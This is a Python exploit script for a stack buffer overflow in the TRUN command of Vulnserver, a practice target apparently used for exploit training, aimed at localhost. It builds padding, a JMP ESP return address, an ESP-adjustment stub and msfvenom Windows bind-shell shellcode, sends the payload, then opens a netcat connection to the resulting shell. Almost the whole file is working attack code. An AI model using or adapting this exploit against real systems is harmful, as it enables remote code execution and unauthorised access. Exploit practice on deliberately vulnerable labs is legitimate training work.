#!/usr/bin/env python

import socket
import sys
import time
import telnetlib
import os
from struct import pack

def sendPayload(host, port, payload):
	try:
		# Sending connection
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,port))
		s.send('')
		data = s.recv(4096)
		print(data)
		s.send('{0}\r\n'.format(payload))
		s.close()
	except:
		print "final length: {length}".format(length = len(payload))
		sys.exit-1()

def main():
	# msfvenom -a x86 --platform windows -p windows/shell_bind_tcp -f python -v bindShell -b '\x00' LPORT=8443
	# Payload size: 355 bytes
	# Final size of python file: 1916 bytes
	bindShell =  ""
	bindShell += "\xdd\xc1\xbd\xbc\x22\xb4\x9d\xd9\x74\x24\xf4\x5f"
	bindShell += "\x31\xc9\xb1\x53\x83\xc7\x04\x31\x6f\x13\x03\xd3"
	bindShell += "\x31\x56\x68\xd7\xde\x14\x93\x27\x1f\x79\x1d\xc2"
	bindShell += "\x2e\xb9\x79\x87\x01\x09\x09\xc5\xad\xe2\x5f\xfd"
	bindShell += "\x26\x86\x77\xf2\x8f\x2d\xae\x3d\x0f\x1d\x92\x5c"
	bindShell += "\x93\x5c\xc7\xbe\xaa\xae\x1a\xbf\xeb\xd3\xd7\xed"
	bindShell += "\xa4\x98\x4a\x01\xc0\xd5\x56\xaa\x9a\xf8\xde\x4f"
	bindShell += "\x6a\xfa\xcf\xde\xe0\xa5\xcf\xe1\x25\xde\x59\xf9"
	bindShell += "\x2a\xdb\x10\x72\x98\x97\xa2\x52\xd0\x58\x08\x9b"
	bindShell += "\xdc\xaa\x50\xdc\xdb\x54\x27\x14\x18\xe8\x30\xe3"
	bindShell += "\x62\x36\xb4\xf7\xc5\xbd\x6e\xd3\xf4\x12\xe8\x90"
	bindShell += "\xfb\xdf\x7e\xfe\x1f\xe1\x53\x75\x1b\x6a\x52\x59"
	bindShell += "\xad\x28\x71\x7d\xf5\xeb\x18\x24\x53\x5d\x24\x36"
	bindShell += "\x3c\x02\x80\x3d\xd1\x57\xb9\x1c\xbe\x94\xf0\x9e"
	bindShell += "\x3e\xb3\x83\xed\x0c\x1c\x38\x79\x3d\xd5\xe6\x7e"
	bindShell += "\x42\xcc\x5f\x10\xbd\xef\x9f\x39\x7a\xbb\xcf\x51"
	bindShell += "\xab\xc4\x9b\xa1\x54\x11\x31\xa9\xf3\xca\x24\x54"
	bindShell += "\x43\xbb\xe8\xf6\x2c\xd1\xe6\x29\x4c\xda\x2c\x42"
	bindShell += "\xe5\x27\xcf\x4c\x0d\xae\x29\xe6\xe1\xe7\xe2\x9e"
	bindShell += "\xc3\xd3\x3a\x39\x3b\x36\x13\xad\x74\x50\xa4\xd2"
	bindShell += "\x84\x76\x82\x44\x0f\x95\x16\x75\x10\xb0\x3e\xe2"
	bindShell += "\x87\x4e\xaf\x41\x39\x4e\xfa\x31\xda\xdd\x61\xc1"
	bindShell += "\x95\xfd\x3d\x96\xf2\x30\x34\x72\xef\x6b\xee\x60"
	bindShell += "\xf2\xea\xc9\x20\x29\xcf\xd4\xa9\xbc\x6b\xf3\xb9"
	bindShell += "\x78\x73\xbf\xed\xd4\x22\x69\x5b\x93\x9c\xdb\x35"
	bindShell += "\x4d\x72\xb2\xd1\x08\xb8\x05\xa7\x14\x95\xf3\x47"
	bindShell += "\xa4\x40\x42\x78\x09\x05\x42\x01\x77\xb5\xad\xd8"
	bindShell += "\x33\xc5\xe7\x40\x15\x4e\xae\x11\x27\x13\x51\xcc"
	bindShell += "\x64\x2a\xd2\xe4\x14\xc9\xca\x8d\x11\x95\x4c\x7e"
	bindShell += "\x68\x86\x38\x80\xdf\xa7\x68"

	# Add 0x320 to ESP
	# XOR EAX, EAX
	# SUB EAX, 0x1c0e2c15
	# SUB EAX, 0x5b2f3a29
	# SUB EAX, 0x88c296a2
	# ADD ESP, EAX
	adjESP = "\x31\xC0\x2D\x01\x26\x03\x2A\x2D\x05\x5A\x34\x5E\x2D\x26\x78\xC8\x77\x29\xC4"

	# Target Host
	host = '127.0.0.1'
	port = 9999

	# Bind port
	bport = 8443

	# Jump found in essfunc.dll
	espJump = pack('<i', 0x625011AF)

	# front padding/payload
	front = 'A' * 2003

	# tail padding/payload
	tail = adjESP + bindShell + 'B' * (5050 - len(front) - len(espJump) -len(bindShell) - len(adjESP))

	payload = 'TRUN /.:/' + front + espJump + tail

	print('Total payload length: {0}'.format(len(payload)))
	print('Front padding length: {0}'.format(len(front)))
	print('Tail padding length: {0}'.format((5050 - len(espJump) - len(tail))))

	print('\r\n\r\n[+] Sending payload')
	sendPayload(host, port, payload)
	print('[+] Connecting to bind shell')
	os.system('nc {0} {1}'.format(host, bport))
	print('[+] Connection closed.')

if __name__ == "__main__":
	sys.exit(main())
